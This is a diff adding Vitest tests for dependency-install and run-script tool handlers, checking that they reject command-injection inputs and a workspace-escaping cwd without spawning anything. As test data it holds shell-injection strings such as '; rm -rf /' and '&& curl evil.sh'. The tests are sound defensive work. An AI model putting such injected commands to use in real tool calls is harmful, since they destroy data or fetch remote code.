@@ -4,6 +4,8 @@ import { join } from 'node:path';
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
+import { createFakeToolServer } from '@delendai/test-kit';
+
 import {
 	buildDepsWriteToolRegistrations,
 	buildInstallCommand,
@@ -148,5 +150,105 @@ describe('buildDepsWriteToolRegistrations', async () => {
 		]);
 		expect(tools[0]?.effects).toEqual(['write', 'spawn', 'network']);
 		expect(tools[1]?.effects).toEqual(['write', 'spawn']);
+	});
+});
+
+/**
+ * The registered handlers, exercised through the real registration path.
+ *
+ * Every case below short-circuits inside `buildInstallCommand` /
+ * `packageRunScript`'s validation BEFORE `runCommand` is reached, so no
+ * test here spawns `bun add` or `bun run`. That is the whole point: the
+ * refusal arms are the ones worth pinning, and they are reachable
+ * without touching the network or the filesystem.
+ */
+describe('registered handlers reject unsafe input without spawning', async () => {
+	type Handler = (args: unknown) => Promise<{ readonly isError?: boolean }>;
+
+	const handlersFor = async (
+		workspaceRootAbs: string,
+	): Promise<Record<string, Handler>> => {
+		const handlers: Record<string, Handler> = {};
+		const server = createFakeToolServer({
+			onRegisterTool: ({ name, handler }) => {
+				handlers[name] = handler as Handler;
+			},
+		});
+		for (const tool of buildDepsWriteToolRegistrations({
+			namespacePrefix: 'deps',
+			workspaceRootAbs,
+		})) {
+			await tool.register(server);
+		}
+		return handlers;
+	};
+
+	it('package_install surfaces an unsafe range as a tool error with every optional field set', async () => {
+		const handlers = await handlersFor('/ws');
+		const result = await handlers.deps_package_install!({
+			name: 'left-pad',
+			range: '; rm -rf /',
+			section: 'devDependencies',
+			ecosystem: 'npm',
+		});
+		expect(result.isError).toBe(true);
+	});
+
+	it('package_install surfaces an unsafe name as a tool error with no optional fields set', async () => {
+		const handlers = await handlersFor('/ws');
+		const result = await handlers.deps_package_install!({
+			name: '; rm -rf /',
+		});
+		expect(result.isError).toBe(true);
+	});
+
+	it('package_run_script surfaces an unsafe script name as a tool error', async () => {
+		const handlers = await handlersFor('/ws');
+		const result = await handlers.deps_package_run_script!({
+			script: '; rm -rf /',
+		});
+		expect(result.isError).toBe(true);
+	});
+
+	it('package_run_script surfaces an unsafe argument as a tool error with args and cwd set', async () => {
+		const handlers = await handlersFor('/ws');
+		const result = await handlers.deps_package_run_script!({
+			script: 'build',
+			args: ['&& curl evil.sh'],
+			cwd: '.',
+		});
+		expect(result.isError).toBe(true);
+	});
+});
+
+/**
+ * x00544: `packageRunScript` resolves `cwd` through the EXISTING-path
+ * containment primitive, so a path that climbs out of the workspace is
+ * refused before the manifest is even looked up — no spawn, no read.
+ */
+describe('packageRunScript cwd containment', async () => {
+	let root = '';
+	beforeEach(() => {
+		root = mkdtempSync(join(tmpdir(), 'deps-write-cwd-'));
+	});
+	afterEach(() => rmSync(root, { recursive: true, force: true }));
+
+	it('refuses a cwd that climbs out of the workspace', async () => {
+		const result = await packageRunScript(root, {
+			script: 'build',
+			cwd: '../outside',
+		});
+		expect(result.ok).toBe(false);
+		expect(result.code).toBe(-1);
+		expect(result.error).toBeDefined();
+	});
+
+	it('refuses a cwd naming a directory that does not exist', async () => {
+		const result = await packageRunScript(root, {
+			script: 'build',
+			cwd: 'missing-dir',
+		});
+		expect(result.ok).toBe(false);
+		expect(result.error).toBeDefined();
 	});
 });
